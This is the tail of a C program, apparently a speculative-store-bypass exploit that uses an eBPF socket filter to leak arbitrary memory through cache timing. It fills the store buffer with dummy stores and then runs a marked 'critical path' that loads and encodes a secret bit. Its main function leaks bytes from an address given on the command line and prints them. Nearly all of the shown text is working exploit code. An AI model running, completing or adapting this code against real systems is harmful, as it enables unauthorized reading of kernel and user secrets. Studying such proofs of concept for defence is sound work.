      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5580, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5600, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5680, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5700, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5780, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5800, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5880, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5900, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5980, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5a00, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5a80, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5b00, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5b80, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5c00, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5c80, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5d00, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5d80, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5e00, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5e80, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5f00, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5f80, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6000, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6080, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6100, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6200, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6280, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6300, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6380, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6400, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6480, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6500, 0xffff), 
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x6580, 0xffff), //42 ins to fill store buffer

      BPF_MOV64_REG(BPF_REG_DUMMY_SLOT, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_DUMMY_SLOT, -216),

      /* START CRITICAL PATH */
      BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS, BPF_REG_SLOW_SLOT, 0), 
      BPF_STX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS, BPF_REG_DUMMY_SLOT, 0), /* bypassed store via high-latency address */
      BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED, BPF_REG_CONFUSED_SLOT, 0),

      BPF_LDX_MEM(BPF_DW, BPF_REG_SECRET_VALUE, BPF_REG_CONFUSED, 0),
      BPF_ALU64_REG(BPF_RSH, BPF_REG_SECRET_VALUE, BPF_REG_8),
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_SECRET_VALUE, 12),
      BPF_ALU64_IMM(BPF_AND, BPF_REG_SECRET_VALUE, 0x1000),
      BPF_ALU64_REG(BPF_ADD, BPF_REG_LEAK_ARRAY, BPF_REG_SECRET_VALUE),
      BPF_LDX_MEM(BPF_B, BPF_REG_0, BPF_REG_LEAK_ARRAY, 0),
      /* END CRITICAL PATH */

      BPF_MOV64_IMM(BPF_REG_0, 0),
      BPF_EXIT_INSN()
    };
  sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  puts("BPF PROG LOADED SUCCESSFULLY");
  //getchar();

  max_cpus = atoi(argv[1]);
  main_cpu = 0;
  bounce_cpu = 1;
  pin_to(main_cpu);
  
  trprog = create_timed_reader_prog(leak_map);
  load_bounce_prog(leak_map);
  cacheline_bounce_worker_enable();

  unsigned long base_addr = strtoull(argv[2], NULL, 16);
  printf("Leaking %lX Byte From Address %lX\n", base_addr,base_addr);
  for (int i=0; i<atoi(argv[3]); i++) {
    unsigned long addr = base_addr + i;
    unsigned char leaked = leak_byte(addr);
    printf("%016lx: 0x%02hhx ('%c')\n", addr, leaked, leaked);
  }

  return 0;
}

